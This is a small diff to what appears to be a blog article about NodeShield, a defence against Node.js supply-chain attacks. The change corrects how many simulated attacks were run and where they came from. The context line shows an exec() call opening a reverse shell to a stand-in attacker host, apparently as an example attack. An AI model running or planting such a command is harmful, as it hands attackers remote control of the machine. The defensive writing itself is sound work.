@@ -258,7 +258,7 @@ exec('/bin/sh -i >& /dev/tcp/attacker.example.com/4444 0>&1');
 
 ## Real-World Results: 1,000+ Attack Simulations
 
-I ran NodeShield against 1,043 simulated supply chain attacks (dataset from NodeShield research paper, arXiv 2508.13750).
+I built 1,043 simulated supply chain attacks in my homelab, modeled on the attack patterns NodeShield's paper describes (arXiv 2508.13750). The paper's own test set is 67 known attacks, which it reports blocking at 98%+.
 
 **Attack categories tested:**
 
